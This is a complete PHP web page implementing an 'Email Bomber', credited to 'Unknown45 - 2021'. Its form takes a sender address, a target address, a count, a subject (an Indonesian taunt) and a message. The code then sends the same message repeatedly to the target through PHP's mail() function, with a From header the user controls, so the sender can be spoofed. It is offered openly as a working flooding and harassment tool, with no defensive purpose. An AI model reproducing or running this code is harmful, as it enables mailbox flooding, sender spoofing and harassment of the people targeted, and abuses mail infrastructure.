 <html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
    @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 500px;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
    background: transparent;
    font-family: Staatliches;
    color: #ffffff;
    border-color: #ffffff;
    cursor: pointer;
}

input {
    background: transparent;
    font-family: Staatliches;
    color: #ffffff;
    border-color: #ffffff;
    cursor: pointer;
}

font {
    font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
</style>
<?php
        print "<title>[+] Email Bomber [+]</title>";
        print "<body text='black' bgcolor='#ffffff'>";
        print "<center>";
        print "<font face=courier new size=5>Email Bomber</font><font face=courier new><hr>";  
        print "<form action=".$_SERVER['PHP_SELF']." method='post'>";
        print "From<br>";
        print "<input type='text' name='from' size='30' value='tukangdepes@protonmail.com'><br>";
        print "To<br>";
        print "<input type='text' name='to' size='30' value='target@email.com'><br>";
        print "Amount<br>";
        print "<input type='text' name='amount' size='3' maxlength='2' value='10'><br>";
        print "Subject<br>";
        print "<input type='text' name='subject' size='30' value='mampus kena email bomber :v'><br>";
        print "Message<br>";
        print "<textarea name='body' rows='8' cols='35'></textarea><br><br>";
        print "<input type='submit' name='submit' class='asu' value='Send'><br>";
        print "</form>"; 
        echo "<br><center><hr><font size=3>Unknown45 - 2021</font>";
     
        print "<br>";
        if (isset($_POST['submit']))
        {
           echo " ";
            $mail_from=$_POST["from"];
            $mail_to=$_POST["to"];
            $times = $_REQUEST['amount'];
           if(!is_numeric($times)) {echo "Invalid value for 'Amount'.<br><a href='javascript:history.go(-1)'>back</a>";exit;}
            $mail_subject=$_POST["subject"];
            $mail_body=$_POST["body"];
            $mail_headers=implode("\n",array("From: $mail_from","Subject: $mail_subject","Return-Path: $mail_from","MIME-Version: 1.0?","X-Priority: 3","Content-Type: text/html" ));
           //header("Content-Type: text/plain");
        $count = 1;
        while($count <= $times) {
            $status=mail($mail_to,$mail_subject,$mail_body,$mail_headers);
        ++$count;
        }
        if($status)
            {
                echo "<b>Sent !<b><br><br>";
            }
            else
            {
                echo "Failed<br><br>";
            }
     
            //exit;
        }
        //include("xvk98.php");
        print "</center></body>";
        //www.fb.com/Sarkilahh
     
     
        ?>
    <br>
    <br>
</script>
    <br>
    <br>
    <br>
 <?php
     
    ?></center>

